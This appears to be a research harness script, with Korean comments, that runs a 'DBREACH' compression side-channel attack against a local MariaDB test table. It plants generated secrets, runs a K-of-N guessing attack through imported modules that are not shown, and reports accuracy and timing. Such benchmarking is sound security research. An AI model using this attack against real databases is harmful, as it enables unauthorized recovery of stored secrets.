#!/usr/bin/env python3
"""
run_kofn_attack.py - Binary K-of-N Attack Runner
기본 설정으로 Gallop-DBREACH K-of-N 공격 실행

사용법:
  docker exec -it flask_container python /app/run_kofn_attack.py

옵션:
  --k NUM          : secret 개수 (기본: 5)
  --n NUM          : 전체 guess 개수 (기본: 500)
  --source TYPE    : random, english (기본: random)
  --seed NUM       : 랜덤 시드
  --verbose        : 상세 로그
"""
import os
import sys

# Path 설정
if "/app" not in sys.path:
    sys.path.insert(0, "/app")

# ===== 환경 변수 설정 (모듈 import 전에 설정해야 함!) =====
# 작은 값 사용: 성공한 로그 기준 100/100/200
os.environ["DBREACH_COMP_BASE"] = os.environ.get("DBREACH_COMP_BASE", "100")
os.environ["DBREACH_PHASE_SPAN"] = os.environ.get("DBREACH_PHASE_SPAN", "100")
os.environ["DBREACH_MAX_ROW_SIZE"] = os.environ.get("DBREACH_MAX_ROW_SIZE", "200")
os.environ["DBREACH_FILLER_ROWS"] = os.environ.get("DBREACH_FILLER_ROWS", "600")
os.environ["DBREACH_LOG_FULL"] = os.environ.get("DBREACH_LOG_FULL", "0")

import time
import random
import string

# ===== 기본 설정 =====
DEFAULT_K = 5
DEFAULT_N = 500
DEFAULT_SOURCE = "random"

# ===== 인자 파싱 =====
k = DEFAULT_K
n = DEFAULT_N
source = DEFAULT_SOURCE
seed = None
verbose = False

args = sys.argv[1:]
i = 0
while i < len(args):
    a = args[i]
    if a == "--k" and i + 1 < len(args):
        k = int(args[i + 1])
        i += 2
    elif a == "--n" and i + 1 < len(args):
        n = int(args[i + 1])
        i += 2
    elif a == "--source" and i + 1 < len(args):
        source = args[i + 1]
        i += 2
    elif a == "--seed" and i + 1 < len(args):
        seed = int(args[i + 1])
        i += 2
    elif a == "--verbose":
        verbose = True
        os.environ["DBREACH_LOG_FULL"] = "1"
        i += 1
    else:
        i += 1

# ===== 모듈 로드 =====
import utils.mariadb_utils as utils
import dbreacher_impl_binary_search as dbreach_impl
import k_of_n_attacker_binary as kofn_attacker

# ===== 설정 상수 =====
COMP_BASE = int(os.getenv("DBREACH_COMP_BASE", "100"))
PHASE_SPAN = int(os.getenv("DBREACH_PHASE_SPAN", "100"))
MAX_ROW_SIZE = int(os.getenv("DBREACH_MAX_ROW_SIZE", "200"))
FILLER_ROWS = int(os.getenv("DBREACH_FILLER_ROWS", "600"))

# ===== Guess 로드 =====
def load_guesses(source_type, total_n, num_k, rng_seed=None):
    rng = random.Random(rng_seed) if rng_seed else random.Random()

    if source_type == "random":
        secrets = [''.join(rng.choices(string.ascii_lowercase, k=rng.randint(10, 20)))
                   for _ in range(num_k)]
        wrongs = [''.join(rng.choices(string.ascii_lowercase, k=rng.randint(10, 20)))
                  for _ in range(total_n - num_k)]
        return secrets, secrets + wrongs

    elif source_type == "english":
        filepath = "/app/resources/10000-english.txt"
        if not os.path.exists(filepath):
            print(f"[ERROR] {filepath} not found, falling back to random")
            return load_guesses("random", total_n, num_k, rng_seed)
        with open(filepath, 'r') as f:
            words = [line.strip() for line in f if line.strip()]
        rng.shuffle(words)
        secrets = words[:num_k]
        guesses = words[:total_n]
        return secrets, guesses

    else:
        return load_guesses("random", total_n, num_k, rng_seed)

# ===== 메인 실행 =====
def main():
    print("=" * 60)
    print("G-DBREACH Binary K-of-N Attack")
    print("=" * 60)
    print(f"[CONFIG] k={k}, n={n}, source={source}")
    print(f"[CONFIG] COMP_BASE={COMP_BASE}, PHASE_SPAN={PHASE_SPAN}")
    print(f"[CONFIG] MAX_ROW_SIZE={MAX_ROW_SIZE}, FILLER_ROWS={FILLER_ROWS}")

    # DB 연결
    db_host = os.getenv("DB_HOST", "mariadb_container")
    db_port = int(os.getenv("DB_PORT", "3306"))
    db_name = os.getenv("DB_NAME", "flask_db")
    db_user = os.getenv("DB_USER", "root")
    db_pass = os.getenv("DB_PASSWORD", "your_root_password")
    datadir = os.getenv("MARIA_DATADIR", "/var/lib/mysql")

    controller = utils.MariaDBController(db_name, db_host, db_port, db_user, db_pass, datadir)

    tablename = "victimtable"
    controller.create_basic_table(tablename, varchar_len=MAX_ROW_SIZE + 100)

    # Guess 로드
    secrets, guesses = load_guesses(source, n, k, seed)

    print(f"\n[SETUP] Inserting {k} secrets into table")
    for idx, secret in enumerate(secrets):
        controller.insert_row(tablename, idx + 1, secret)
        print(f"  secret[{idx+1}] = '{secret}'")

    # DBREACHer 생성
    start_idx = 10000
    filler_charset = tuple(string.printable)
    compress_char_ascii = ord('*')

    dbreacher = dbreach_impl.DBREACHerImpl(
        controller, tablename, start_idx,
        MAX_ROW_SIZE, filler_charset, compress_char_ascii
    )

    print(f"\n[INIT] DBREACHer created: startIdx={start_idx}, maxRowSize={MAX_ROW_SIZE}")

    # K-of-N Attacker 생성
    attacker = kofn_attacker.kOfNAttacker(k, dbreacher, guesses, tiesOn=True)

    # Setup
    print("\n[ATTACK] Starting setup...")
    setup_start = time.time()

    for attempt in range(1, 11):
        success = attacker.setUp()
        if success:
            print(f"[SETUP] Attempt {attempt}/10 -> SUCCESS")
            break
        print(f"[SETUP] Attempt {attempt}/10 -> FAILED, retrying...")
    else:
        print("[ERROR] Failed to setup after 10 attempts")
        return

    setup_time = time.time() - setup_start

    # 공격 실행
    print("\n[ATTACK] Testing all guesses...")
    attack_start = time.time()

    success = attacker.tryAllGuesses(verbose=verbose)

    if not success:
        print("[ERROR] Attack failed during guess testing")
        return

    attack_time = time.time() - attack_start
    per_guess_time = attack_time / len(guesses) if guesses else 0

    # 결과
    print("\n" + "=" * 60)
    print("RESULTS")
    print("=" * 60)

    top_k = attacker.getTopKGuesses()

    print(f"\nTop-{k} guesses (score, guess):")
    for score, guess in top_k:
        marker = " <-- SECRET" if guess in secrets else ""
        print(f"  {score:.6f}  '{guess}'{marker}")

    # Accuracy 계산
    top_k_guesses = set([g for _, g in top_k])
    secret_set = set(secrets)
    correct = len(top_k_guesses.intersection(secret_set))
    accuracy = correct / k if k > 0 else 0

    print(f"\n[SUMMARY]")
    print(f"  Secrets: {secrets}")
    print(f"  Accuracy: {accuracy:.3f} ({correct}/{k})")
    print(f"  Setup time: {setup_time:.2f}s")
    print(f"  Attack time: {attack_time:.2f}s")
    print(f"  Per-guess time: {per_guess_time:.4f}s")
    print(f"  DB queries: {dbreacher.db_count}")

    # CSV 형식 출력
    print(f"\nrecords_on_page,k,accuracy,setup_time,per_guess_time,db_queries")
    print(f"{k},{k},{accuracy:.3f},{setup_time:.2f},{per_guess_time:.4f},{dbreacher.db_count}")

if __name__ == "__main__":
    main()
